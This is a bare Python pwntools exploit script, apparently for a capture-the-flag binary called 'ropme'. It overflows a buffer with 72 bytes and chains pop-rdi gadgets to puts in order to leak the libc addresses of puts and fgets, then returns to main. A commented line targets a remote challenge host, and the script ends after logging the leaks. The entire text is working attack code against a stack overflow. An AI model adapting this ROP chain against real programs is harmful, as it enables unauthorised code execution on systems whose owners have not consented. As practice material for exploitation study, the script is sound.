#!/bin/env python3
from pwn import *

exe = ELF('./ropme_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)

p = process(exe.path)
#p = remote('64.227.39.88', 32705)

offset = b'A'*72

rop = ROP([exe])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
fgets_got = exe.got['fgets']
main_plt = exe.symbols['main']

payload = offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(fgets_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.sendlineafter(b'dah?\n', payload)
puts_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
fgets_got_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

log.info(f'puts_got_leak: {hex(puts_got_leak)}')
log.info(f'fgets_got_leak: {hex(fgets_got_leak)}')
